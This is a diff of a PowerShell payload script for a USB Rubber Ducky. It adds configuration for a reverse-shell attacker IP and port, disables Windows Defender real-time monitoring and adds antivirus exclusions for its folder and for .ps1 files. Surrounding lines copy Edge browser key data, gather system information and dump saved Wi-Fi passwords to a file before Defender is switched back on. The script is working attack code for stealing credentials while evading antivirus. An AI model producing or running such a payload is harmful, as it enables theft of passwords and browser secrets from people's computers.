@@ -1,4 +1,24 @@
-$destDir = "C:\Users\$env:UserName\Downloads\tmp"
+
+
+#-- Payload configuration --#
+
+$DRIVE = 'DUCKY'          # Drive letter of the USB Rubber Ducky
+$IP = 'YOUR_IP'     # IP address of the attacker machine
+$PORT = 'YOUR_PORT'            # Port to use for the reverse shell
+
+
+# Set destination directory
+
+
+
+$duckletter = "C:\Users\Noah\Downloads\tmp"
+Set-Location $duckletter
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "${duckletter}\"
+Set-MpPreference -ExclusionExtension "ps1"
+
+$destDir = "C:\Users\Noah\Downloads\tmp"
 if (-Not (Test-Path $destDir)) {
     New-Item -ItemType Directory -Path $destDir
 }
@@ -52,7 +72,7 @@ Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destin
 
 # Gather additional system information
 function GatherSystemInfo {
-    $sysInfoDir = "$C:\Users\$env:UserName\Downloads\tmp\SystemInfo"
+    $sysInfoDir = "$destDir"
     if (-Not (Test-Path $sysInfoDir)) {
         New-Item -ItemType Directory -Path $sysInfoDir
     }
@@ -86,7 +106,13 @@ function GetWifiPasswords {
     $results | Format-Table -AutoSize
 
     # Save results to a file
-    $results | Out-File -FilePath "C:\Users\$env:UserName\Downloads\tmp\WiFi_Details.txt"
+    $results | Out-File -FilePath "$destDir\WiFi_Details.txt"
 }
 
 GetWifiPasswords
+
+# Re-enable Windows Defender real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $false
+
+exit
+
